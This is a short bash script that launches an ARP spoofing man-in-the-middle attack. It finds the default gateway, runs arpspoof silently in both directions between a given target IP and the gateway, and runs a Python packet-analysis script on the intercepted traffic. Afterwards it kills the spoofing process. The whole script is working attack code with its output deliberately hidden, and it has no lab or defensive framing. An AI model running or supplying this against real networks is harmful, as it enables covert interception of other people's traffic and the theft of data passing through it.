#!/bin/bash
INTERFACE=$2
TARGET_IP=$1

# Determine the gateway IP without any output
GATEWAY_IP=$(ip route | awk '/default/ {print $3; exit}')

# Suppress the echo statement for the gateway IP
if [ -z "$GATEWAY_IP" ]; then
    echo "Could not determine the gateway address" >&2
    exit 1
fi

# Suppress the echo statement for starting the attack
echo "Starting ARP spoofing attack on $TARGET_IP via gateway $GATEWAY_IP on interface $INTERFACE" >&2

# Perform ARP spoofing attack with no output to the console
sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY_IP" &> /dev/null &
ARP_PID=$!

# Allow some time for arpspoof to take effect
sleep 5

# Run the Python packet analysis script with no output to the console
sudo python3 new1.py "$INTERFACE" "$TARGET_IP" 

# Clean up by killing the arpspoof process with no output
kill "$ARP_PID" &> /dev/null

# Suppress the echo statement for cleanup
echo "ARP spoofing attack cleaned up." >&2
